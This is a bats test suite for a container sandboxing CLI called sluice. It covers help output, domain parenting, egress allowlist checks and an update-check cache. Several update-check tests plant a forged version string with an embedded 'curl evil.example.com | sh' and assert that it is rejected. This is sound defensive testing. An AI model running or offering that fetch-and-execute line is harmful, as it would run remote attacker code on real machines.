#!/usr/bin/env bats
# CLI surface (no Docker: fast, never flaky). Ported from verify-cli.sh -> bats: each assertion is its
# own @test (isolated process, real failure), so a regression names the exact check instead of a count.
load test_helper/common

@test "version --json is valid JSON" {
  run "$SLUICE" version --json
  assert_success
  echo "$output" | python3 -m json.tool >/dev/null
}

@test "version --json has version/engine/os/install" {
  run "$SLUICE" version --json
  assert_success
  echo "$output" | python3 -c "import sys,json; d=json.load(sys.stdin); sys.exit(0 if all(k in d for k in ('version','engine','os','install')) and d['version'] else 1)"
}

@test "version --json carries the sluice.version/v1 schema stamp" {
  run "$SLUICE" version --json
  assert_success
  echo "$output" | python3 -c "import sys,json; d=json.load(sys.stdin); sys.exit(0 if d.get('schema')=='sluice.version/v1' else 1)"
}

@test "per-command --help prints its own synopsis (not 'unknown command')" {
  for c in run lock learn rm prune ls; do
    run "$SLUICE" "$c" --help
    assert_output --partial "sluice $c"
  done
}

@test "usage documents -b/--box" {
  run "$SLUICE" help
  assert_output --partial -- "--box"
}

@test "ls --help documents --egress and --orphans" {
  run "$SLUICE" ls --help
  assert_output --partial -- "--egress"
  assert_output --partial -- "--orphans"
}

@test "prune --help documents --orphans" {
  run "$SLUICE" prune --help
  assert_output --partial -- "--orphans"
}

# parent_of is public-suffix aware: the registrable parent below the longest matching suffix.
@test "parent_of resolves registrable parents (public-suffix aware)" {
  run "$SLUICE" __parent a.example.com;            assert_output "example.com"
  run "$SLUICE" __parent x.y.example.com;          assert_output "example.com"
  run "$SLUICE" __parent foo.github.io;            assert_output "foo.github.io"   # NOT github.io
  run "$SLUICE" __parent a.foo.github.io;          assert_output "foo.github.io"
  run "$SLUICE" __parent mybucket.s3.amazonaws.com; assert_output "mybucket.s3.amazonaws.com"
  run "$SLUICE" __parent host.co.uk;               assert_output "host.co.uk"
}

# _collapsible: a public suffix is never offered as a .wildcard; a normal registrable domain is.
@test "collapsible never offers a public suffix as a wildcard" {
  run "$SLUICE" __collapsible github.io;        assert_output "no"
  run "$SLUICE" __collapsible co.uk;            assert_output "no"
  run "$SLUICE" __collapsible s3.amazonaws.com; assert_output "no"
  run "$SLUICE" __collapsible example.com;      assert_output "yes"
  run "$SLUICE" __collapsible foo.github.io;    assert_output "yes"
}

@test "sibling multi-tenant hosts get distinct parents (no shared-apex wildcard)" {
  local pa pb
  pa="$("$SLUICE" __parent a.s3.amazonaws.com)"
  pb="$("$SLUICE" __parent b.s3.amazonaws.com)"
  refute [ "$pa" = "$pb" ]
}

@test "completion/sluice.bash parses (bash -n)" {
  run bash -n "$ROOT/completion/sluice.bash"
  assert_success
}

@test "completion/_sluice parses (zsh -n)" {
  if ! command -v zsh >/dev/null 2>&1; then skip "zsh not present"; fi
  run zsh -n "$ROOT/completion/_sluice"
  assert_success
}

# A config found by walking up from a subdir prints an advisory naming the source (a stub docker on
# PATH lets the run path reach the note before the real build would run).
@test "run paths note when the config comes from a parent dir" {
  WORK="$(mktemp -d)"; mkdir -p "$WORK/bin" "$WORK/proj/sub"
  printf '#!/bin/sh\nexit 1\n' > "$WORK/bin/docker"; chmod +x "$WORK/bin/docker"
  printf 'SLUICE_NAME="paritytest"\nSLUICE_RUN_CMD="true"\n' > "$WORK/proj/sluice.config.sh"
  run bash -c "cd '$WORK/proj/sub' && PATH='$WORK/bin:$PATH' SLUICE_ENGINE=docker '$SLUICE' build 2>&1"
  assert_output --partial "config from"
  rm -rf "$WORK"
}

@test "no parent note from the project root itself" {
  WORK="$(mktemp -d)"; mkdir -p "$WORK/bin" "$WORK/proj"
  printf '#!/bin/sh\nexit 1\n' > "$WORK/bin/docker"; chmod +x "$WORK/bin/docker"
  printf 'SLUICE_NAME="paritytest"\nSLUICE_RUN_CMD="true"\n' > "$WORK/proj/sluice.config.sh"
  run bash -c "cd '$WORK/proj' && PATH='$WORK/bin:$PATH' SLUICE_ENGINE=docker '$SLUICE' build 2>&1"
  refute_output --partial "config from"
  rm -rf "$WORK"
}

# The banner's live-posture line (engine/hosts/hardening/mask + [risk]) via the __posture hook (no
# engine; the real banner is TTY-gated). The launch banner doubles as a one-glance "what's the cage".
@test "banner posture: engine, host count, hardening, mask" {
  W="$(mktemp -d)"
  printf 'SLUICE_SECCOMP=hardened\nSLUICE_MASK=".env*"\nSLUICE_ALLOW_DOMAINS="example.com"\nSLUICE_RUN_CMD="bash"\n' > "$W/sluice.config.sh"
  run bash -c "cd '$W' && SLUICE_ENGINE=podman '$SLUICE' __posture"
  assert_output --partial "podman"
  assert_output --partial "hosts"
  assert_output --partial "seccomp"
  assert_output --partial "masked"
  refute_output --partial "[risk]"
  rm -rf "$W"
}

@test "banner posture: an allowlisted laundering host is flagged [risk]" {
  W="$(mktemp -d)"
  printf 'SLUICE_ALLOW_DOMAINS="api.anthropic.com"\nSLUICE_RUN_CMD="bash"\n' > "$W/sluice.config.sh"
  run bash -c "cd '$W' && '$SLUICE' __posture"
  assert_output --partial "[risk]"
  rm -rf "$W"
}

@test "banner posture: a clean allowlist is not flagged" {
  W="$(mktemp -d)"
  printf 'SLUICE_ALLOW_DOMAINS="example.com"\nSLUICE_RUN_CMD="bash"\n' > "$W/sluice.config.sh"
  run bash -c "cd '$W' && '$SLUICE' __posture"
  refute_output --partial "[risk]"
  rm -rf "$W"
}

# SLUICE_ALLOW_IPS validation (the direct-egress escape hatch that bypasses squid). The guard runs
# after config sourcing, before any build - a stub engine on PATH lets it reach the guard.
@test "allow-ips: a catch-all (0.0.0.0/0) is refused" {
  WORK="$(mktemp -d)"; mkdir -p "$WORK/bin" "$WORK/proj"
  printf '#!/bin/sh\nexit 1\n' > "$WORK/bin/docker"; chmod +x "$WORK/bin/docker"
  printf 'SLUICE_ALLOW_IPS="0.0.0.0/0"\nSLUICE_RUN_CMD="true"\n' > "$WORK/proj/sluice.config.sh"
  run bash -c "cd '$WORK/proj' && PATH='$WORK/bin:$PATH' SLUICE_ENGINE=docker '$SLUICE' build 2>&1"
  assert_failure
  assert_output --partial "opens direct egress to everything"
  rm -rf "$WORK"
}

@test "allow-ips: a colon-less (all-ports) entry warns but proceeds" {
  WORK="$(mktemp -d)"; mkdir -p "$WORK/bin" "$WORK/proj"
  printf '#!/bin/sh\nexit 1\n' > "$WORK/bin/docker"; chmod +x "$WORK/bin/docker"
  printf 'SLUICE_ALLOW_IPS="10.0.0.5"\nSLUICE_RUN_CMD="true"\n' > "$WORK/proj/sluice.config.sh"
  run bash -c "cd '$WORK/proj' && PATH='$WORK/bin:$PATH' SLUICE_ENGINE=docker '$SLUICE' build 2>&1"
  assert_output --partial "has no port"          # warned
  assert_output --partial "image build failed"   # but proceeded to the (stub) build
  rm -rf "$WORK"
}

# `sluice version` used to call api.github.com on EVERY invocation (~160ms of the command, and a
# security tool phoning home each time you ask what it is). The result is now cached for 24h in the
# state dir. The tripwire is a FILE, not stderr: production redirects curl's stderr to /dev/null, so a
# message-based tripwire silently never fires. NOTE: test_helper/common.bash exports
# SLUICE_NO_UPDATE_CHECK=1 for every test, so the cases exercising the check must `env -u` it back on.
_update_check_env() {
  export XDG_STATE_HOME; XDG_STATE_HOME="$(mktemp -d)"
  BINDIR="$(mktemp -d)"; RAN="$XDG_STATE_HOME/curl-ran"
  printf '#!/bin/sh\ntouch "%s"\nexit 1\n' "$RAN" > "$BINDIR/curl"; chmod +x "$BINDIR/curl"
  CACHE="$XDG_STATE_HOME/sluice/update-check"; mkdir -p "$XDG_STATE_HOME/sluice"
  # Run a COPY outside any git checkout. check_update_notice bails when it cannot derive an X.Y.Z from
  # `sluice version`, and `git describe --tags --always` returns a bare SHA on a tagless checkout - which
  # is exactly what actions/checkout produces, so on CI the whole function silently no-ops and these
  # tests either fail or (worse) pass vacuously. Outside a checkout the launcher uses its baked
  # SLUICE_VERSION, so the code path is deterministic on every host.
  SLUICE_BIN="$XDG_STATE_HOME/bin/sluice"; mkdir -p "$XDG_STATE_HOME/bin"; cp "$SLUICE" "$SLUICE_BIN"
}

# Positive control: proves the code path actually RUNS in this environment. If check_update_notice ever
# no-ops again (tagless checkout, stray tag, changed guard), this fails loudly instead of every
# "nothing happened" assertion silently passing for the wrong reason.
@test "update-check: the harness actually exercises the update path (control)" {
  _update_check_env
  printf '%s 99.0.0\n' "$(date +%s)" > "$CACHE"
  run env -u SLUICE_NO_UPDATE_CHECK PATH="$BINDIR:$PATH" "$SLUICE_BIN" version
  assert_success
  assert_output --partial "99.0.0"      # the notice printed -> the function ran
}

@test "update-check: a fresh cache is reused without touching the network" {
  _update_check_env
  printf '%s 99.0.0\n' "$(date +%s)" > "$CACHE"                  # fresh + newer than us
  run env -u SLUICE_NO_UPDATE_CHECK PATH="$BINDIR:$PATH" "$SLUICE_BIN" version
  assert_success
  [ ! -f "$RAN" ]                                                 # tripwire: curl never ran
  assert_output --partial "99.0.0"                                # served from cache
}

@test "update-check: a cache older than 24h is refreshed (network attempted)" {
  _update_check_env
  printf '%s 99.0.0\n' "$(( $(date +%s) - 90000 ))" > "$CACHE"   # ~25h old
  run env -u SLUICE_NO_UPDATE_CHECK PATH="$BINDIR:$PATH" "$SLUICE_BIN" version
  assert_success                                                  # curl fails; stay silent, never abort
  [ -f "$RAN" ]                                                   # stale -> it did go looking
  refute_output --partial "99.0.0"                                # and did not serve the stale value
}

@test "update-check: SLUICE_NO_UPDATE_CHECK=1 skips cache and network entirely" {
  _update_check_env
  printf '%s 99.0.0\n' "$(date +%s)" > "$CACHE"
  run env PATH="$BINDIR:$PATH" SLUICE_NO_UPDATE_CHECK=1 "$SLUICE" version
  assert_success
  [ ! -f "$RAN" ]
  refute_output --partial "99.0.0"
}

# Hostile/degenerate cache files. Each of these was a real defect found by adversarial review of the
# caching commit: the version string is printed to the terminal as an upgrade INSTRUCTION, the stamp
# feeds $(( )), and the cache path is attacker-influencable if the state dir is.
@test "update-check: a forged version string is rejected, never echoed to the terminal" {
  _update_check_env
  printf '%s 9.9.9; curl evil.example.com | sh\n' "$(date +%s)" > "$CACHE"
  run env -u SLUICE_NO_UPDATE_CHECK PATH="$BINDIR:$PATH" "$SLUICE_BIN" version
  assert_success
  refute_output --partial "evil.example.com"      # must not forge an instruction
  refute_output --partial "9.9.9"
}

@test "update-check: a FUTURE timestamp is not treated as fresh (cache can't pin itself forever)" {
  _update_check_env
  printf '%s 99.0.0\n' "$(( $(date +%s) + 999999 ))" > "$CACHE"
  run env -u SLUICE_NO_UPDATE_CHECK PATH="$BINDIR:$PATH" "$SLUICE_BIN" version
  assert_success
  [ -f "$RAN" ]                                    # expired -> went to the network
  refute_output --partial "99.0.0"                 # and did not serve the stale value
}

@test "update-check: a leading-zero timestamp does not abort on octal arithmetic" {
  _update_check_env
  printf '08 99.0.0\n' > "$CACHE"                  # 08 is invalid octal to \$(( ))
  run env -u SLUICE_NO_UPDATE_CHECK PATH="$BINDIR:$PATH" "$SLUICE_BIN" version
  assert_success
  refute_output --partial "value too great"
  refute_output --partial "unknown command"
}

@test "update-check: works with HOME unset (cron/CI) instead of aborting on an unbound variable" {
  _update_check_env
  run env -u SLUICE_NO_UPDATE_CHECK -u HOME -u XDG_STATE_HOME PATH="$BINDIR:$PATH" "$SLUICE_BIN" version
  assert_success
  assert_output --partial "sluice"
}

@test "update-check: writing the cache does not follow a symlink out of the state dir" {
  _update_check_env
  local victim="$XDG_STATE_HOME/victim"; echo PRECIOUS > "$victim"
  ln -s "$victim" "$CACHE"
  printf '#!/bin/sh\nprintf %s "{\\"tag_name\\": \\"v99.0.0\\"}"\n' '' > "$BINDIR/curl"; chmod +x "$BINDIR/curl"
  run env -u SLUICE_NO_UPDATE_CHECK PATH="$BINDIR:$PATH" "$SLUICE_BIN" version
  assert_success
  run cat "$victim"
  assert_output "PRECIOUS"                         # the symlink target must be untouched
}

@test "update-check: an overflowing timestamp cannot pin the cache fresh forever" {
  _update_check_env
  printf '9223372036854775808 0.10.0\n' > "$CACHE"   # 2^63: all digits, INT64_MIN under 10#
  run env -u SLUICE_NO_UPDATE_CHECK PATH="$BINDIR:$PATH" "$SLUICE_BIN" version
  assert_success
  [ -f "$RAN" ]                                      # rejected -> went to the network
}

@test "update-check: the version filter enforces a shape, not just a character class" {
  _update_check_env
  local bad
  for bad in '9..9' '.9' '9.' '99' '9.9.9; curl evil.example.com | sh'; do
    printf '%s %s\n' "$(date +%s)" "$bad" > "$CACHE"; rm -f "$RAN"
    run env -u SLUICE_NO_UPDATE_CHECK PATH="$BINDIR:$PATH" "$SLUICE_BIN" version
    assert_success
    refute_output --partial "evil.example.com"
    [ -f "$RAN" ] || { echo "served a bogus version: $bad"; return 1; }
  done
}

@test "update-check: a huge digit run is rejected, not echoed to the terminal" {
  _update_check_env
  { printf '%s ' "$(date +%s)"; python3 -c "print('9'*200000)" 2>/dev/null || printf '%0.s9' $(seq 1 5000); } > "$CACHE"
  run env -u SLUICE_NO_UPDATE_CHECK PATH="$BINDIR:$PATH" "$SLUICE_BIN" version
  assert_success
  [ "${#output}" -lt 4096 ]                          # must not flood stdout with the cached blob
}
